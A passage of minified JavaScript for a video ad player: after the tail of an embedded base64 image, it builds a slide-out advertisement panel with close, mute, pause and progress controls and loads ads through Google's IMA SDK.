hO+2Ql2Wf9jjw9AUc+uKDPu/4Ahn4rEUxuDs6OnSNRaYEYo3md/ps6WGxjubRDRFnSYGqZBEPiopE2aAJPE7CFDU0NuryopgjYxrDrvrCwlO9D5U8ufYjGL7ACBOHwk5O2uO2/oGLNLKgHBNU6LTUxN4CIZamO9N0Vpau9JmgM1cq1DFpWtLiltT7By4M0t+3K7V026C/A8WdrdSxlsgMl4MaKB9+5ajjF7UGKKRtYCdBewSWUEinF2io1RqPCbJyAvr+wpjwolgN42DYVtDrYF4Ej5gllu1rHKcDA2Z8YpJeUH8R9Njb+qoaNAv04L9ZBdx0ll6mdmuNGkj1nuN0/wHNqwEFM4CRGfVekqQqrvrdvbuJvrw6qqX0o8YEvbGDaGflIs0rSftjzqaf7jj0+6waLDYDbmdV6B517slvbpCbqKKTJ1x677BLTXUpmlGD5OpNou/PV9DQn7anpHCusquuFaxyZegPgQYQkiHax3yRTCm0wpGVpWBlCAr2lMuqYmtvb9dETQBZj7ZMZ8WZ7wEwUNX19V/w5sRqBG97uVZfEwTSaCCT1nTrD5T6SyX1s3S/+Zq285DYZzVNmX/8hIYvD2slKvsH3yugderrqX1fs1KvSj7tXF9g7vE8DQ1e0XyL0EoA3nYrtOJGq1cDet/+FnVupUdjZ7l5bSkkEXEEaEoIHPoduFy7di1LL5g7z7dyQZVzIpyMADu/PQGwIJwEsNLTihrY53tAbWBO3Nf3K928NZq5r5X9wfLY5uZX6J2339ISitdxYd6vf7/UJEVNIzL1v8UVaZnuz+s8+K2wnfBeJV291y+JrB1lMkpcUylTz9NPKy2irpOwvGvl0zaQUpBN9vf3Z51VaFFMA4M4kXEtJ19oDRdkEizeB0nx89BGdUj4AfCQAOjAgTblnr+rbSzo3mFL0aqrqxTodbrEN1TMyMht3Qlx55alRoxsrRaTRCQcHc8L0Z8c1XlJkE9iQLorybzSGbDJylDigQI2jf+lvDGstJSlpdgKdH55kEBDDg0NaU0FdYu/zDwXZE+JxEtyf6wUF4RtRfDB62xv3nrkyBEaGBjIEiDG7Tw+HuByTWjZoGJmZ+cCrxkU2ZL+QL5ji5mretJlZ2hdhXrNFK1PrZBkHygAmtysh29lHCU3+zwZDeWufCb2brnQAWYGHByamJjIYXCNRWMneX/5NY9HsPxQBwTY1oZFblY7lCadiTCQCg06ySjGv4e5CGXnMUO2//lYY0nmUFmRgqN0UaaDTMGLvgWD6ODgoD4fAAMPRNwAcFg/2WHShAthwss/BKBi3gpPWNKhlxL6KvS/MIB5Pl2qqmUAJbObn6ha2kz/M8kgvbRzcpZQiD5PVhSBpHJwnu8PU4jQLQMaOkjDwlL8wySpJIw15pDwyIrl+Ys6f5RlPILySdiJK5dmkL9berz53v743zVLU+CfURQKccrrQmDglMpoETaECaM0p1CsFp0KvQ5PmFUxohrHjx+n4eFhPXLyvb8MYgKN4vAEkR0Xo+IZJAafizHku16hpSNRn7cU/mN+FcqknlzNAuFBABwl/h2ZcBISik7BZ6zTRU0UDl+tVWZOBlXawtVasVHuZ0ZolBnB8czoZ3+MtyhQsxNu1SEAEmEp6HbclN/l6Ys4a6vGXtBoZhu1Hl6zsR2GECGCpNcd+WIDRYHqV50AEyoM0R6/rZHz1TB1G1e9xVFlQfcM+hs2/Qk6J4qTF0ZeHXZ8vr6WDiiCDPCGZd2ZkiWVH4LVAJcJy3n3uAolwzZzk86hJHSOqqWcqDeRrrz0BEuZ1piWXzsW/6rRjcb5IEtxBLnzppXfF4jbr3Ia5UQ5mNcu+W3Fo0fz+gU6L0UxrTwOEmK7cT30ZWzEcpZ8UseqNyiSAjd7amrSIFLGdmfyHjU07ogV5oRQ2bZXQzWVUnitp1V1poVHxNhUGg79DWaLNbCmSzaGPZYSa0DdOLNbI6kbuRlQDaimGVBNey6esAHVSKppBlTTDKimGVBNM6AaUE0zoJpmQDXNgGqaAdWAarrAgGqaAdU0A6ppBlTTDKgGVNMMqKatNVDD2EHDU+rSpgfL3Cw7FdLflIdfysphnrOjVNHlE/wAl7M2zWZuUqD81HT+Pg7qb0415XP/F6C9s4mto7ri+J15z0lIQuIkxHFwQr6aBmicCJBQkBIVsmPHprBCiK6gO6RKRSxQVxUL2gWqSqVKbLqo1EVXlboDUSRgAQgpKFRAPrAdx44cO8Y4H/jNm97fnTnP941nnt+z5704yflLo+fnNx937pz/PR/3zD1a6VihuANQvVdv3B/FXn755XU7duz40/bt21/t7+8PWSeZ1W5kVGOdzfn5+fq1a9f+Nj09/drbb799o5WKUyhKl9d7VdCEqC+88MK7g4ODrwwMDLh1xthYTpOlwKTwJ4sMsYAci9+wTU5OvvvOO+/8Romq0MhDD3Dy5Mn3LGFfWQHJX33uuefeU/FRqOnbAywsLLzE6jKsR++vzompm2P6ulXEWcuf/a2mfcme4tcqQgolapcxNTVFIYb7WHKRwlVUCMG0xUdlbUchLms9QlR+l2X/JyYmbqr4KJSoPcClS5f+HEXRby0JAzQlBGVzxZ/TEj6yZiqr7kopQbvF58+f/4uKj6JXuOeDSfbzje3bt//Omrpb0KKYwLLsuF8AHK2K5rVadc5q4rfs///A8RpMUihRe0DUFFTVe82S9MWNGzcObNy4aUBKOqU+6pXr169fsUT9h/3XH+3WqKutRFX0RF5ff/2NGLNv/fq+hgDLUvlSv0dKXmdr9cm+UhWkVZm1vLpCfsmbtSTww8PHXeWQ0dHvXRmevXv3qqTchRB5bFUpNlsjKq/2RVGpwbzzyTXhF9abBDGljpfPJ9wwyh1SNb5KlRnWcZ6bm20UUPYLgHEQpuCxY8dc8WrK9vF/LpC9obxyCf6nnNO/uWwq21rA1aszTd+ffvrpnlxXtXP3+zev8oNfja8V/Kq4ecV7ip6fzwv4xHmYq0f5ff31126OXgoZSJEa+AXXKDDr6pZIaSKCJxRIlUXyfSJxMEXIpb7m559/3oiMyg0sV43nTsoffeSRXzR9p+7ZWjHXyySzlNe823N76TMp2dnrwdYvJkRfE4ykYCK1UykHxgwCwUvaB9iHZBvqqCYFcqmcWTFV0XDsTHYOZaIhpmhMX7NS0Pz48ePmxIkT5syZMw1S5xUfuptA39ytAtytQWCtxSP88uu9HFAbb0qkNeX3799vFcEj5osvvnCaFJ6JNuWTYse4XePj443ytu54OSlEhM2QVcqLArGXOSF29WeffWa2bt1qnnrqqUa1TdnPN2uLzI7lfrtdm7Q9WxzLN2/W4ub3eafbvUDSXsuZ72NKn/Ida/XgwYOuHhcWKfP22YrrJNmwH2Xn4aIUD+X4UEgoASR+RDUzAqGOZWdR3YAL8b8nn3zSJQGwX7ZwdDaQdIdEf3MrjPv3cbvNxDyS5dXzUt/49tyjI1VKPvjCdzLbHn30UUdUfFIy2wDaU2JA/I01iyblb//VOLgV+lFX3zeFrFyIhHRfBUtJYwqQg1OnTjXS7oSsIjhiMvskLhqFekHCJLV5MWpNhxHVZaNKHqWb+cyew9+HT3H+OwmClXWPvovhP7Pe1Ay39xwbF3SMg9TySPs0MLXMnlFjH6ddAuOOZf8gTuUsDhvnCOyPybnq6XGhJzORR7TFZ2hCGbTC9JjFWAnXi4PmFlkv1VBcMtmn3mhTWaQXUvkWJj4pBN21a5ezRsl8IybkB5bgGXIFUf3KmP51qlI4VS4kAsjB/f39ThBQ05JSJ3Y0Zi8XJhr8xBNPOJsbUuPPiQDJ6ILGFYHyp3e6Odpla4/yfX5+zlkAra6XECByW55JyHfOwQOQ69DxBNeKfJSyi9n70crsINtNVCyxakHV9MULZrg+aY7VRsyG+KbpC0LvHuOUAHmDZN3MhevNmWCPOVMZMnElcsQxYd29/W4gW5wS2f4dxjVTj9EmFUf8SqVuTh6aNCd+fsns2HzTBFHdDRqRDAJhOlgwANSp8mHPUYnNrfo6c/1mxXz0v73mo3O7TT0i/lK1l62besh9WXPVDUBxx4Ou/5x5BlilEhxCERA0YmYFxQaPMG+JAQmZkR0UBETlt6JYT/Dmm7+P3WiW47NAVk6KEyw+rIzc4seyPfzww2bnzp3OJGZ/olYyTyQNauVolylg2TktNjqIuWIRbAmBtyJPHtGz1+E8Emji923btjXMmV6Zy9JGMbO6q09j82ztrDkQXfW0WKMljpxhOuhH6T1XXPssIUwlbS/ksnvVK2a0b5v5d/WI/SWAVylBU9K5fosb2vPFU2fN8O4pO1BEjnwwi0twXghZhWzGszYcXwOUrvdQ7bVNnzk73m/+/uGwqYWphRBXUy1cb1u+snOvviJC9pGzI0eOOGUnvEDm5DnxyffR0VHnl8IVP2+hWQbDxbVY/IvJjowKsBy1zYklCUL24+QI5jfffOPUNj4rJEWz8hvHswlBioI0ZZLVJwUkOnTokJtS8jt6ZmbWnL/wvbk6zQAUN+aP/XZklyZJ9kFzGHf8BY53862LZj4D2oEDB5qixK1qRq/2Pv1NwvvdxMT4pJmdnklN1CgVcuNIUrH9CCmgAlvgTNs4/d5nf2v2o6uWcJiBly9PWq1pj4/7kqEgjlPTOtHCnJ9pipnpKRNVau48lq32rPZ5WHUYRoEjeBRzTNQwueNK0h5+C1KSomnJGZiZnjWjlyccQRPzG81a70i+sprUn4ZhGx4edpr0k08+ccSEJ+wHYYVDFy9edNMwkrLqL72SRTVvdPY7lBPzf16oRivx3desXAByQlZ+wwzGJEaL0TjI7Zu8fv5sNsupbJP3gQceMCMjY46UO3fuMps2Jh0yODjg9pm2RP3e/p6Yj2aJC5BnplcqgenfutXs3/9Q+jvHhtZH/8lcmZwye/dectbF2NhYbuZKWdZC9ry9MH3Hx0bNWwvrjXV8zOnBqnl2V2wG+iJ4Yyph4LRlomkXTd/k2cfWP7Sa0P7vaq1q/jMZmPcnAvOTJde6vlHz4IMPWrJGi5pDfGF7zrr9HB+fMK//1WqjvnXmV6ci8/wzxuzadsteJ0y1buJvQtzAXiuC+KhoNkvABdtHUzOB+ecHfeZf/7UWlm3mpvCy2T00yLyHNaETn7WT5yDEykZ3+R8KC/n/+OOPHTcgpvyGi8Sx3333nVNokLSdZAtn+kojswKabRhgFJRRQRogjebC+/btc3NFX375pQu60FB/lCi0wUsiqu+IQxg65v0PPnSjMiM1v23Zstllhmxwmq/eEfkXzd6ambO+6uzsXCMcv2dot3nmmV86HxZzJutLtnOPKyGbH1jqNi6OXTJjF0ad+RphwloKVmKM4kpjoBND2fVdXPHMZH5PA3C2Px46MOTSMxPXMGx6Fs19l2jVkQtj9pqxhJ+SvgoXZZbBgcEiFo42/ORkEHCmcD0y+/cdNEMPDSa+bBqLyF6/ndiADI7wgGAqf5NngDsoCULCDT4lfkNKIPtLBmCr5y6mby5R88w138yCgDJZK+pegkdoUFINCUdDViZvIYU/79fKKS/TPwXM+WK6ExYfv3TFabpaPWq0t4g8y5mrclzFPt89e/aYoaEh65McdvfLYCaDWKcDUDv75/n5vZiCaPIf7Y3Xa5E1938w12Z/tIP0vBW+W6a2cNPUotj5jlgf6/tCc591nzbct8n6a1vM1v5Nphr2LZIZRlXDJHgXh8v4hRW3XxQt2AFy3l53zvx440ezwHVv1cytONHaVfts163HB6zagfp+JwP9/Zttm60l6IJUIYrWaWRDLDhIgk/LBZN8JeBHZwksohkfe+wxN0ifPXvWffdJyHfkAZ8UhSZTnXlW24qJmk1MpgFEtCCrNMZPikDtkzhBBgYqHnKgWbOpiTS8GymGecJL2/AZMOG5RzTelStTzq+kc2nzzVsLztejXTKtRJvl1bdNGzeYTZs3uwDBwM4dzrRmH86VrvrQNNJ2K6CUd/6eAYGuJIElp9XqaUS/HnjTIb4JvBj1dfrUDpIQE5s2iBd9x4Q09SWDbZOyECIHNUeqqE5fVJPPRuBJpmkqzVM6zoFOLQ+nja11BUnihZzAWPsWDNYlkdujR4+6yC3a0g8wsvEdMsMD+IEs+S+i+MRftUbNRoPZD+EUFS7Ek1Qo1D8CTSYGk7iYLuI0izbzJ4V7YbZlhZ220olskJG2+MEy6SjaBwnpZIl0CymLhKodrZ8dpRXtWzTtuhBlDJB5b4khI5APkjIFwxw7ubvEZXyFhmyhQUdGRhpynn0DZ/n7CDtb4cF/BQ7SkRSBmYdmFXtcIsM0mN8IMhEBI3p87tw59+mrfMmGaseHK1MrSYQtfRm8I+HIe+WpU/9ZBrQyg0Cd9k/RCN7utFUZfdIqWNbLvmhHg/oJLigpYiCPP/64M2e//fbbRmRXeMDgD5mJ7ha9cdYuOiKqzNOJ88yFISvfmQKhgRBRNBDmLv9nshfTAHKT2M8+shSnJCW3I7CrfXjLCWGrjJM8U7ZT89N/2H4o3l9Noow51bKSKfIizEVBQN8f918F69T3LmpPkUmcnddst39WGjuQxe52797tZJrYB0QVksq0ZvIu6Q9Ok3KMBJJWio6IKg2RtCdJHpCsHDSrTObKw+IGaDCBJUYftCsmAscJqf0spm6bU2Ueuxpt6KdWZrXR7UT2PWHxpYp8KN9C8Aeg7HubrYjkz+P7mVbZFyKKztmumbucpZAtPbGELFaukWUCh4cPHzZfffWVIynyL3kD8iZaMkd8uUFSfypnJc+5I6Jm81v9CxOokYiwvLYjqYPciKQcYs+TscFNirD6KYfZIFZeFlPepHM7xyxHqk736fT8ef3Z6WCRjSHkEcEXuk4GkyLzVfyzXvqmvoaWNvXqndIiPxdfk+kkiIriIVmBbDQJKskUDAFK4jIcjzLKxjK6rlGLktDF1BWyyioQPllpMGT99NNPHVFPnz7dlATR8+jlHQqZ4hLiZFdLlP9LtFosn7Wise+E/vVfQvEDibhyaFTiLmhMpn1kwEXWkXHRpEJajivDYqyu9EbyTEBsd8nEoMGSoCyCJdFVnGumbfw5pF5k1twtQpQ15bKaNe+NGiGzYnVRXwY+ZJhor/ijsiqDJNdL3i6KSQbKIteha0TNar6sgGAC4JcSEZMsJhougiJ+mbwDmx1pOjVtixL88/ZrLxTe2rdp5/yd1a5cfj8/kJG1aoreT817q6ad9rXbv3n9Usb9L/ecO+m3TmMUeffv/z9v6k6mY5gjxRT2Ky74sxmrVULVMkYbX4hEzUsmBvZ60bo8ao4p7lTLRj6FjEzxydTMSuW7KCjmXjst2zzwgxkSDZR0qaKGq+mrWKtuhq+I8qwISdgpK7GiqC3Vsm/Of181bw4sL5undysUKBTtkyZvja+870VrgZWhtUslqm/Ly/xXnh+V1bo43y7PUogchyohijVHVHmVc/P9G7rqqhWtM4wOqxKJvXFjvmnyvVPn1w9y5L0m13y+eoOcfB47dtS9dK5QrFVMXJ4yh362b1k5Xe27x3X3gkM15UfU4JKbo5UAUK+T4hUKhSlUaH6OgYs2d8vGztraGt1VKFbmFztlqt2jUKwNFCW0OA2bXThboVDcbiydAVGNqlDcAVCiKhRKVIVCUQpRdVpGoVjb0KivQqGmr0KhUKIqFEpUhUKhRFUoFEpUhUKJqlAolKgKhUKJqlAoURUKhRJVoVCiKhQKJapCoVCiKhRKVIVCoURVKBRKVIVCiapQKJSoCoUiIWpzTZiVrWifV+hXyigurcURNj7LKPCqUJSNJTIb1JqKmxUdk/e9Ez4ldWeWtiEtOyM1Liorvil/k/NJzUghbLZ2ahDErhCOlrpQrDVkq6r5xJO6v34Fw1aFoTopFwNn/KqH/rXDIsK1S9Is/PqnUvc0e2Oszp9X0l6hWAvatJV8+1UL/d+l3GieJu1EtmVfv3BbFC2Y/wMpfBhJnJCvlgAAAABJRU5ErkJggg==);}";
                        g += "." + this.elements.container.classList[0] + ".wgMadShadow{ -webkit-box-shadow: 28px 1px 70px 15px rgba(0,0,0,0.75); -moz-box-shadow: 28px 1px 70px 15px rgba(0,0,0,0.75); box-shadow: 28px 1px 70px 15px rgba(0,0,0,0.75); }";
                        a.s(g);
                        this.elements.label = a.F("div", "madLabel");
                        this.elements.label.innerText = "Advertisement";
                        this.elements.container.appendChild(this.elements.label);
                        g = "." + this.elements.label.classList[0] + "{ background:#282828; text-align:center; padding:15px; color: #feca39; font-size:12px; position:absolute; top:0; left:0; width:100%; }";
                        a.s(g);
                        this.elements.Ua = a.F("div", "madCloseButton");
                        this.elements.container.appendChild(this.elements.Ua);
                        g = "." + this.elements.Ua.classList[0] + "{  top:0; right:0; padding:5px; cursor:pointer; position: absolute; }";
                        g += "." + this.elements.Ua.classList[0] + ':before{ content:"\u2716"; display: inline-flex; font-size:20px; width:20px; height:20px; color:#aaa;}';
                        a.s(g);
                        this.elements.Ua.addEventListener(a.na, function() {
                            b.aa()
                        });
                        this.elements.Oc = a.F("div", "madAd");
                        this.elements.container.appendChild(this.elements.Oc);
                        g = "." + this.elements.Oc.classList[0] + "{ width:340px; height:280px; margin:0 auto; margin-top:50px; position:relative; }";
                        a.s(g);
                        this.elements.Ia = a.F("div", "madAdContainer");
                        this.elements.Oc.appendChild(this.elements.Ia);
                        g = "." + this.elements.Ia.classList[0] + "{ position:absolute; top:0; left:0; cursor:pointer; background:#3f4146; width:100%; height:100%; background:#3f4146; margin:0 auto; margin:0; padding:0; overflow:hidden; border: 3px solid #4b4e58; border-radius:20px; overflow:hidden; }";
                        a.s(g);
                        this.elements.control.mc = a.F("div", "madSnd");
                        this.elements.Oc.appendChild(this.elements.control.mc);
                        g = "." + this.elements.control.mc.classList[0] + '{ position:absolute; z-index:1000; cursor:pointer; top:10px; right:10px; transition:all .6s; background-image:url("' + this.Lb.yb + '"); background-repeat:no-repeat; background-position: center center; width:30px; height:30px;}';
                        g += "." + this.elements.control.mc.classList[0] + '.unmuted{ background-image:url("' + this.Lb.qb + '"); }';
                        g += "." + this.elements.control.mc.classList[0] + ":before{ content:' '; position:absolute; width:150%; height:150%; margin-left:-30%; margin-top:-30%; }";
                        a.s(g);
                        this.elements.control.mc.addEventListener(a.na, function() {
                            !0 === this.elements.control.state.muted ? (this.yk(), this.ima.B.setVolume(1)) : (this.zk(), this.ima.B.setVolume(0))
                        }.bind(this));
                        this.elements.control.Ic = a.F("div", "madPpause removed");
                        this.elements.Oc.appendChild(this.elements.control.Ic);
                        g = "." + this.elements.control.Ic.classList[0] + '{ position:absolute; z-index:1000; cursor:pointer; opacity:.6; transition:all .6s; background-image:url("' + this.Lb.resume + '"); background-repeat:no-repeat; background-position: center center; width:100px; height:100px; left:50%; top:50%; margin-left:-50px; margin-top:-50px;}';
                        g += "." + this.elements.control.Ic.classList[0] + ":hover{opacity:.9;}";
                        a.s(g);
                        this.elements.control.Ic.addEventListener(a.na, function() {
                            !1 === this.elements.control.state.Je && (this.ima.B.resume(), this.zj())
                        }.bind(this));
                        this.elements.Id = a.F("div", "madFooter");
                        this.elements.container.appendChild(this.elements.Id);
                        g = "." + this.elements.Id.classList[0] + "{ position:absolute; padding:20px; width:100%; background:#282828; margin:0 auto; bottom:0; left:0; text-align:center; border-top:5px solid #4a4a4a;}";
                        a.s(g);
                        this.elements.progress = a.F("div", "madProgress");
                        this.elements.Id.appendChild(this.elements.progress);
                        g = "." + this.elements.progress.classList[0] + "{ width:80%; height:1px; position:relative; background:#fff; margin:0 auto; margin-bottom:20px; margin-top:20px; text-align:left; }";
                        a.s(g);
                        this.elements.Yc = a.F("div", "madProgressElap");
                        this.elements.progress.appendChild(this.elements.Yc);
                        g = "." + this.elements.Yc.classList[0] + "{ position:absolute; width:0%; height:100%; background:#fd722f; text-align:left; }";
                        a.s(g);
                        this.elements.time = a.F("div", "madTime");
                        this.elements.progress.appendChild(this.elements.time);
                        g = "." + this.elements.time.classList[0] + "{ color:#fff; font-size:12px; transform:translateY(-20px); }";
                        a.s(g);
                        this.elements.Tc = a.F("div", "madAdv");
                        this.elements.Tc.innerText = "";
                        this.elements.Id.appendChild(this.elements.Tc);
                        g = "." + this.elements.Tc.classList[0] + "{ max-width:100%; text-align:center; color:#3f8acd; font-size:12px; padding:10px;}";
                        g += "." + this.elements.Tc.classList[0] + ":before{ content: ' Ad '; text-align: center; display: inline-block; background: #f5c235; border: 1px solid #000; border-radius: 3px; overflow: hidden; font-size: 11px; padding: 0px 3px; transform: translate3d(-8px, 4px, 0px); color: #000; }";
                        a.s(g);
                        g = "." + this.elements.sa.classList[0] + "{ " + (!0 === a.options.mad.outside ? "top:" + e + "px;" : "right:-" + c + "px") + "; width:" + c + "px; height:600px;}";
                        g += "." + this.elements.sa.classList[0] + "{ max-height:700px; text-align:left; }";
                        a.options.mad.pos && "relative" === a.options.mad.pos && (g += "." + this.elements.sa.classList[0] + "{ position:relative !important; top:-" + d.height + "px; }");
                        a.s(g);
                        this.ph().appendChild(this.elements.sa);
                        g = ".wgmad.wgSlideOutToRight{transition: 1s ease-in-out; " + ("undefined" !== typeof a.options.mad.defaultZindex ? "z-index:" + a.options.mad.defaultZindex : "") + "}";
                        g += ".wgmad{transform: translate3d(-" + parseInt(this.elements.container.getBoundingClientRect().width + 30, 10) + "px, 0px, 100px);}";
                        g = a.options.mad.pos && "relative" === a.options.mad.pos ? g + ".wgSlideOutToRight{transform: translate3d(100px, 0px, 100px) !important; }" : g + ".wgSlideOutToRight{transform: translate3d(0px, 0px, 100px) !important; }";
                        g += ".wgSlideOutToRight.top{z-index:" + ("undefined" !== typeof a.options.mad.topZindex ? a.options.mad.topZindex : v) + "!important; }";
                        a.s(g + ".wgFadeOutInPlace{opacity:0; transition: 1s;}");
                        this.ima.init.call(this);
                        this.ha = !0;
                        setTimeout(function() {
                            a.mad.ima.getAd.call(a.mad)
                        }, a.options.mad.t1)
                    }.call(this)
                },
                ph: function() {
                    if (!0 === a.options.mad.outside) return document.body;
                    var b = document.getElementById(a.options.mad.container) || document.getElementsByClassName(a.options.mad.container)[0] || document.querySelectorAll(a.options.mad.container)[0];
                    return b ? b : a.G()
                },
                show: function() {
                    this.Vf();
                    this.elements.sa.classList.remove("removed");
                    this.elements.sa.classList.remove("wgFadeOutInPlace");
                    setTimeout(function() {
                        this.elements.sa.classList.add("wgSlideOutToRight")
                    }.bind(this), 10);
                    setTimeout(function() {
                        this.elements.sa.classList.add("top");
                        this.elements.container.classList.add("wgMadShadow")
                    }.bind(this), 1E3);
                    setTimeout(function() {
                        this.ima.B.resume()
                    }.bind(this), 1500);
                    this.visible = !0
                },
                aa: function() {
                    this.elements.sa.classList.remove("top");
                    this.elements.sa.classList.add("wgFadeOutInPlace");
                    setTimeout(function() {
                        this.elements.sa.classList.remove("wgSlideOutToRight");
                        this.elements.sa.classList.add("removed");
                        this.elements.container.classList.remove("wgMadShadow");
                        this.Vf()
                    }.bind(this), 1E3);
                    this.visible = !1
                },
                hi: function() {
                    this.elements.control.Ic.classList.remove("removed");
                    this.elements.control.state.Je = !1
                },
                zj: function() {
                    this.elements.control.Ic.classList.add("removed");
                    this.elements.control.state.Je = !0
                },
                yk: function() {
                    this.elements.control.mc.classList.add("unmuted");
                    this.elements.control.state.muted = !1
                },
                zk: function() {
                    this.elements.control.mc.classList.remove("unmuted");
                    this.elements.control.state.muted = !0
                },
                oi: -1,
                update: function() {
                    var b = this.ima.B.getRemainingTime(),
                        c = Math.floor(b / 60),
                        d = parseFloat(b - 60 * c).toFixed(0),
                        e = Math.floor(b / 3600); - 1 < e ? (this.elements.time.innerText = (e ? e + ":" : "") + c + ":" + (10 > d ? "0" : "") + d, this.elements.Yc.style.width = 100 - 100 / (this.ima.currentAd.getDuration() / b) + "%") : this.elements.time.innerText = ""
                },
                fi: function() {
                    this.elements.Ua.classList.remove("wgHidden")
                },
                Vf: function() {
                    this.elements.Ua.classList.add("wgHidden")
                },
                ima: {
                    count: 0,
                    ha: !1,
                    currentAd: null,
                    Ja: null,
                    Z: null,
                    B: null,
                    S: null,
                    init: function() {
                        a.j(57);
                        this.ima.Ja = new google.ima.AdDisplayContainer(this.elements.Ia);
                        this.ima.Ja.initialize();
                        this.ima.Z = new google.ima.AdsLoader(this.ima.Ja);
                        this.ima.Z.getSettings().setVpaidMode(a.vpaidMode);
                        this.ima.Z.getSettings().setAutoPlayAdBreaks(!0);
                        this.ima.Z.getSettings().setDisableFlashAds(!0);
                        this.ima.Z.getSettings().setDisableCustomPlaybackForIOS10Plus(!0);
                        this.ima.Z.addEventListener(google.ima.AdsManagerLoadedEvent.Type.ADS_MANAGER_LOADED, function(b) {
                            var c = new google.ima.AdsRenderingSettings;
                            c.jh = !0;
                            c.pi = !0;
                            c.Oh = -1;
                            this.ima.B = b.getAdsManager(c);
                            this.ima.B.setVolume(0);
                            !1 === this.elements.control.state.muted ? this.ima.B.setVolume(1) : this.ima.B.setVolume(0);
                            b = [google.ima.AdEvent.Type.AD_METADATA, google.ima.AdEvent.Type.ALL_ADS_COMPLETED, google.ima.AdEvent.Type.CLICK, google.ima.AdEvent.Type.COMPLETE, google.ima.AdEvent.Type.DURATION_CHANGE, google.ima.AdEvent.Type.FIRST_QUARTILE, google.ima.AdEvent.Type.IMPRESSION, google.ima.AdEvent.Type.INTERACTION, google.ima.AdEvent.Type.LINEAR_CHANGED, google.ima.AdEvent.Type.LOADED, google.ima.AdEvent.Type.LOG, google.ima.AdEvent.Type.MIDPOINT, google.ima.AdEvent.Type.PAUSED, google.ima.AdEvent.Type.RESUMED, google.ima.AdEvent.Type.SKIPPABLE_STATE_CHANGED, google.ima.AdEvent.Type.SKIPPED, google.ima.AdEvent.Type.STARTED, google.ima.AdEvent.Type.THIRD_QUARTILE, google.ima.AdEvent.Type.USER_CLOSE, google.ima.AdEvent.Type.VOLUME_CHANGED, google.ima.AdEvent.Type.VOLUME_MUTED];
                            for (var d in google.ima.AdEvent.Type) b.push(google.ima.AdEvent.Type[d]);
                            d = a.df(b);
                            for (var e in d) this.ima.B.addEventListener(d[e], this.ima.Ha.bind(this));
                            this.ima.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.ima.qa.bind(this));
                            this.ima.B.addEventListener(google.ima.AdEvent.Type.ALL_ADS_COMPLETED, this.ima.Ha.bind(this));
                            this.ima.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.ima.qa.bind(this));
                            this.ima.B.addEventListener(google.ima.AdEvent.Type.CONTENT_PAUSE_REQUESTED, this.ima.rb.bind(this));
                            this.ima.B.addEventListener(google.ima.AdEvent.Type.CONTENT_RESUME_REQUESTED, this.ima.sb.bind(this));
                            this.ima.B.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, this.ima.qa.bind(this), !1);
                            try {
                                this.ima.B.init(this.elements.Ia.getBoundingClientRect().width, this.elements.Ia.height, google.ima.ViewMode.NORMAL), a.j(58)
                            } catch (g) {
                                a.j(59, g.getMessage())
                            }
                        }.bind(this), !1);
                        this.ima.Z.addEventListener(google.ima.AdErrorEvent.Type.AD_ERROR, function(b) {
                            this.ima.qa.call(this.ima, b)
                        }.bind(this), !1);
                        this.ima.ha = !0
                    },
                    getAd: function() {
                        this.ima.ha || this.ima.init.call(this);
                        this.ima.count++;
                        var b = "mad=" + this.ima.count,
                            c = a.options.mad.adtag,
                            d = a.options.mad.adtag.match(/cust_params=([0-9A-Za-z%_\-\.]+)/i);
                        null !== d && 0 < d.length ? c = c.replace(d[1], d[1] + encodeURIComponent("&" + b)) : c = c += (0 < c.indexOf("?") ? "&" : "?") + "cust_params=" + encodeURIComponent(b);
                        c = a.Tf(c, {
                            w: this.elements.Ia.getBoundingClientRect().width,
                            h: this.elements.Ia.getBoundingClientRect().height
                        });
                        this.ima.S = new google.ima.AdsRequest;
                        this.ima.S.adTagUrl = c;
                        this.ima.S.linearAdSlotWidth = this.elements.Ia.getBoundingClientRect().width;
                        this.ima.S.linearAdSlotHeight = this.elements.Ia.getBoundingClientRect().height;
                        this.ima.S.nonLinearAdSlotWidth = this.elements.Ia.getBoundingClientRect().width;
                        this.ima.S.nonLinearAdSlotHeight = this.elements.Ia.getBoundingClientRect().height;
                        this.ima.S.setAdWillAutoPlay(!0);
                        this.ima.S.setAdWillPlayMuted(!0);
                        this.ima.S.forceNonLinearFullSlot = !0;
                        this.ima.S.vastLoadTimeout = 1E4;
                        this.ima.Z.requestAds(this.ima.S)
                    },
                    Ha: function(b) {
                        b.type === google.ima.AdEvent.Type.LOADED && (a.j(60), this.ima.currentAd = b.getAd(), this.ima.B.resize(this.elements.Ia.getBoundingClientRect().width, this.elements.Ia.getBoundingClientRect().height, google.ima.ViewMode.NORMAL), this.ima.B.start());
                        b.type === google.ima.AdEvent.Type.CLICK && (this.ima.B.pause(), this.hi(), this.fi())
                    },
                    qa: function(b) {
                        a.j(61, b.getError().getMessage());
                        this.destroy.call(this)
                    },
                    rb: function() {
                        a.j(62);
                        !1 === this.visible && this.show();
                        this.elements.Tc.innerText = 0 < this.ima.currentAd.getAdvertiserName().length ? this.ima.currentAd.getAdvertiserName() : "delivered by Google";
                        this.oi = setInterval(function() {
                            this.update.call(this)
                        }.bind(this), 100)
                    },
                    sb: function() {
                        a.j(63);
                        clearInterval(this.oi);
                        this.aa();
                        this.ima.destroy()
                    },
                    destroy: function() {
                        this.Z && (this.Z.contentComplete(), this.Z.destroy(), this.Z = null);
                        this.Ja && (this.Ja.destroy(), this.Ja = null);
                        this.B && (this.B.destroy(), this.B = null);
                        this.ha = !1;
                        a.mad.Vf();
                        setTimeout(function() {
                            a.mad.ima.getAd.call(a.mad)
                        }, a.options.mad.t2)
                    }
                }
            },
            fb: [],
            wi: function() {
                return {
                    count: 0,
                    ha: !1,
                    Of: !1,
                    currentAd: null,
                    Vk: !1,
                    Ja: null,
                    Xc: null,
                    size: {
                        w: 0,
                        h: 0
                    },
                    Z: null,
                    B: null,
                    S: null,
                    jg: [],
                    jc: {
                        Ha: null,
                        qa: null,
                        sb: null,
                        rb: null
                    },
